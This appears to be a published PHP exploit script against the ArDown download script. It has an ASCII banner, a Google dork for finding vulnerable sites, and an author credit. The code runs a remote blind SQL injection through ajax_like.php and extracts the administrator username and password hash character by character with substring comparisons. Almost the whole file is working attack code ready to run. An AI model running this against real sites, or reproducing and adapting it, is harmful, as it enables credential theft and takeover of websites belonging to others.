<?php
echo "
                 _____   _    _   _____   _____  _______
                /  ___| | |  | | /  _  \ /  ___/|__   __|
                | |  _  | |__| | | | | | | |___    | |
                | | | | |  __  | | | | | \___  \   | |
                | |_| | | |  | | | |_| |  ___| |   | |
                \_____/ |_|  |_| \_____/ /_____/   |_|
             ____    _       _____   _____   _____  ___    ___
            |  _ \  | |     /  _  \ /  _  \ |  _  \ \  \  /  /
            | |_) | | |     | | | | | | | | | | |  \ \  \/  /
            |  _ (  | |     | | | | | | | | | | |  |  \    /
            | |_) | | |___  | |_| | | |_| | | |_|  /   |  |
            |____/  |_____| \_____/ \_____/ |_____/    |__|

[*]-----------------------------------------------------------------------[*]
    # Exploit Title  : ArDown (All Version) <- Remote Blind SQL Injection
    # Google Dork    : 'powered by AraDown'
    # Date           : 08/07/2012
    # Exploit Author : G-B
    # Email          : g22b@hotmail.com
    # Software Link  : http://aradown.info/
    # Version        : All Version
[*]-----------------------------------------------------------------------[*]

[*] Target -> ";

$target = stdin();
$ar = array('1','2','3','4','5','6','7','8','9','0','a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z');

echo "[*] Username : ";

for($i=1;$i<=30;$i++){
    foreach($ar as $char){
        $b = send('http://server',"3' and (select substr(username,$i,1) from aradown_admin)='$char' # ");
        if(eregi('<span class="on_img" align="center"></span>',$b) && $char == 'z'){
            $i = 50;
            break;
        }
        if(eregi('<span class="on_img" align="center"></span>',$b)) continue;
        echo $char;
        break;
    }
}

echo "\n[*] Password : ";

for($i=1;$i<=32;$i++){
    foreach($ar as $char){
        $b = send('http://server',"3' and (select substr(password,$i,1) from aradown_admin)='$char' # ");
        if(eregi('<span class="on_img" align="center"></span>',$b)) continue;
        echo $char;
        break;
    }
}

function send($target,$query){
    $ch = curl_init();
    curl_setopt($ch,CURLOPT_URL,"$target/ajax_like.php");
    curl_setopt($ch,CURLOPT_POST,true);
    curl_setopt($ch,CURLOPT_POSTFIELDS,array('id'=>$query));
    curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
    $r = curl_exec($ch);
    curl_close($ch);
    return $r;
}
function stdin(){
    $fp = fopen("php://stdin","r");
    $line = trim(fgets($fp));
    fclose($fp);
    return $line;
}
?>